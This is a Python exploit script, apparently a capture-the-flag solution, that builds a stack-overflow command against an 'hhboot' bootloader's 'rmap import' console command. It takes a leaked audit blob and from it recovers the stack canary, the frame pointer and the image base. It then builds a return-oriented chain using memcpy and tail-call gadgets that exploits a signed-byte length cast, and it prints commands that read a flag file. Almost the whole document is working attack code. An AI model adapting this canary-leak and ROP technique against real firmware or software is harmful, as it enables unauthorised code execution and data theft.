#!/usr/bin/env python3
"""Build the hhboot `rmap import` stack-overflow command.

The input audit blob is the hexadecimal payload printed after
``profile audit: `` by ``rmap audit 280`` (the minimum useful length).
"""

from __future__ import annotations

import argparse
import hashlib
import re
import struct
from pathlib import Path


PLAT_DOMAIN = b"HH-R1:K9F2:8C71:PLAT:v8:000000XYZ\0"


def p64(value: int) -> bytes:
    return struct.pack("<Q", value & ((1 << 64) - 1))


def u64(data: bytes) -> int:
    return struct.unpack("<Q", data)[0]


def hidden_physical(serial: int) -> int:
    digest = hashlib.sha256(PLAT_DOMAIN + struct.pack("<Q", serial)).digest()
    mix = (
        struct.unpack_from("<I", digest, 5)[0]
        ^ struct.unpack_from("<I", digest, 17)[0]
        ^ struct.unpack_from("<I", digest, 25)[0]
    )
    return (((mix & 0xFFF) + 1) << 16) | 0x1800


def extract_audit(text: str) -> bytes:
    match = re.search(r"profile audit:\s*([0-9a-fA-F]{512,})", text)
    if not match:
        compact = "".join(text.split())
        if re.fullmatch(r"[0-9a-fA-F]{512,}", compact):
            match_text = compact
        else:
            raise ValueError("could not find the profile-audit hexadecimal blob")
    else:
        match_text = match.group(1)
    if len(match_text) & 1:
        raise ValueError("audit hex has odd length")
    return bytes.fromhex(match_text)


def build_command(serial: int, audit: bytes) -> tuple[str, dict[str, int]]:
    if len(audit) < 280:
        raise ValueError("audit leak is too short")

    canary = u64(audit[256:264])
    caller_fp = u64(audit[264:272])
    audit_lr = u64(audit[272:280])
    # BL at 0x914c returns to 0x9150.  In hhboot_shell (0x8ab8), x29 is set
    # immediately after the 0x60-byte callee-save frame and the local SP is
    # then lowered by exactly 0x2f0.
    image_base = audit_lr - 0x9150
    shell_sp = caller_fp - 0x2F0
    import_buffer = shell_sp - 0xC8
    physical = hidden_physical(serial)

    payload = bytearray(240)
    # 0xed18 loads a call target from [x22 + 0x40], sets x0/x1/x2
    # from x19/x20/x21, pops a 0x30-byte frame, and tail-branches to it.
    payload[0:8] = p64(image_base + 0x72D0)  # memcpy
    payload[8:16] = struct.pack("<II", 0x1000, physical)
    # The main call site at 0x7b18 loads the second hhboot_shell argument
    # from [x20+0x10].  The observed active generation is 8.
    payload[16:20] = struct.pack("<I", 8)
    payload[96:104] = p64(canary)
    payload[104:112] = p64(0)
    payload[112:120] = p64(image_base + 0xED18)
    payload[120:128] = p64(image_base + 0xA0008)
    payload[128:136] = p64(import_buffer + 8)
    payload[136:144] = p64(8)
    payload[144:152] = p64(import_buffer - 0x40)
    # The tail-call gadget's frame begins at the caller's original SP.  A
    # direct return to 0x8ab8 would pass memcpy's return value as the serial.
    # Instead return through main's real call site, which reconstructs x0/x1
    # from the callee-saved x21/x20 values popped just below.
    payload[200:208] = p64(0)
    payload[208:216] = p64(image_base + 0x7B18)
    payload[216:224] = p64(0)  # post-gadget x19 (unused)
    payload[224:232] = p64(import_buffer)  # post-gadget x20 / generation source
    payload[232:240] = p64(serial)  # post-gadget x21 / serial

    # 0xd8 becomes negative after the parser's erroneous signed-byte cast,
    # bypassing its nominal 96-byte cumulative-output limit.
    command = f"rmap import 0 1 0 {len(payload):02x}{payload.hex()}"
    if len(command) >= 512:
        raise AssertionError("command does not fit the 512-byte console line")
    details = {
        "canary": canary,
        "image_base": image_base,
        "caller_fp": caller_fp,
        "shell_sp": shell_sp,
        "import_buffer": import_buffer,
        "physical": physical,
    }
    return command, details


def parse_int(value: str) -> int:
    return int(value, 0)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("serial", type=parse_int)
    parser.add_argument("audit", type=Path, help="file containing audit output or raw hex")
    args = parser.parse_args()
    audit = extract_audit(args.audit.read_text(errors="replace"))
    command, details = build_command(args.serial, audit)
    for name, value in details.items():
        print(f"{name}={value:#x}")
    print(command)
    print("ext4ls rmap 0 /")
    print("ext4load rmap 0 0x100000 FLAG_BASENAME")
    print("md.b 0x100000 FLAG_SIZE")


if __name__ == "__main__":
    main()
